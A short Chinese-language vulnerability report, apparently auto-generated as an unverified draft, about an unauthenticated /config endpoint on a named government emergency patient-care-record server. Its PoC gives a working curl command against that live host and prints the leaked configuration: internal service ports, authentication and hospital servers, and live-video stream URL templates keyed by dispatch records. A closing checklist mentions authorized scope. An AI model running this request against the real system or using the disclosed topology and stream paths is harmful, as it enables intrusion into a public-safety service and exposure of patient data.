# POC/EXP — 4000 /config 未授权泄露完整微服务拓扑与视频流模板

> 漏洞ID: `46fb1d55-de31-4120-868b-cfcee631fb2a`  | 嚴重度: **high** | 狀態: open | 目標: `https://epcr.tpf.gov.tw:4000/config`

**類型**: 敏感信息泄露

## 描述

4000 EPCR 前端 Express 服务在 /config 路径未做鉴权，直接返回完整后端微服务拓扑、视频路径模板、SSO/captcha/打印/统计等关键配置。攻击者可据此一次性映射整个系统架构，定位 4001/4002/4003/4004/4005/4006/4007/4008/9000 等端口以及 mer2/mer2voip/cloud2 外部依赖，属于高价值敏感信息泄露入口。

## 前置條件

公网可达 https://epcr.tpf.gov.tw:4000

## POC / 復現步驟

```
curl -sk https://epcr.tpf.gov.tw:4000/config 返回 HTTP 200，JSON 1057B，关键字段：vitalSignVideoServer=https://epcr.tpf.gov.tw:4001, authServer=https://epcr.tpf.gov.tw:4004, hospitalServer=https://epcr.tpf.gov.tw:4002, monitorServer=http://epcr.tpf.gov.tw:4005, mciServer=http://epcr.tpf.gov.tw:4008/client/, printServer=http://epcr.tpf.gov.tw:9000, VideoPath=rtmp://mer2voip.tpf.gov.tw/rtmp/live, RealTimeVideoPath=https://mer2voip.tpf.gov.tw:30080/live?app=rtmp&stream=live${dispatchRecordUuid}, captcha.enable=true
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
